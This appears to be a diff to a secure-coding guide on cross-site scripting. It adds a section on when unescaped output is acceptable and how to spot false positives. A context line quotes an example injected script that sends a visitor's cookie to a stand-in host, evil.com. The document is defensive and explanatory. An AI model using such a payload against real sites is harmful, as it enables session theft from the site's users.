@@ -215,3 +215,14 @@ Attacker can inject: `<script>document.location='https://evil.com/?c='+document.
 // With proper encoding
 ```
 ```
+
+## When This Is Acceptable
+
+- **API-only projects** — JSON APIs don't need HTML encoding; Content-Type: application/json prevents XSS
+- **Internal admin tools** — Tools used only by authenticated admins with trusted input
+- **Template engines** — Twig/Blade auto-escape by default; raw output requires explicit `|raw` or `{!! !!}`
+
+### False Positive Indicators
+- Response has `Content-Type: application/json` header
+- Project has no HTML templates (pure API)
+- Template engine auto-escaping is enabled (Twig default)
